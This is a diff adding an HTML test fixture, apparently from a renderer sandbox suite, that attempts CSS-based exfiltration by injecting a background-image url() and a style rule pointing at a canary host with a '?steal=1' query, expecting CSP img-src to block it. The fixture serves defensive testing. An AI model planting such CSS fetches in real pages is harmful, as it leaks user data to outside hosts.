@@ -1,0 +1,23 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>attack: CSS url() exfil</title>
+<!-- ATTACK: exfiltrate by making the renderer fetch a remote CSS resource
+     (background-image url). Governed by CSP img-src. Canary must stay silent. -->
+<script>
+  const canary = (window.bridge.getArgs() || {}).canary || {};
+  const r = { attack: 'css-exfil' };
+  try {
+    // Append to <html>, which always exists while this in-<head> script runs
+    // (document.body may still be null mid-parse).
+    const div = document.createElement('div');
+    div.style.backgroundImage = 'url("' + canary.http + '/bg.png?steal=1")';
+    document.documentElement.appendChild(div);
+
+    const style = document.createElement('style');
+    style.textContent = 'html{background:url("' + canary.http + '/css2.png")}';
+    document.documentElement.appendChild(style);
+  } catch (e) {
+    r.threw = String(e);
+  }
+  setTimeout(() => window.bridge.emit('done', r), 1200);
+</script>
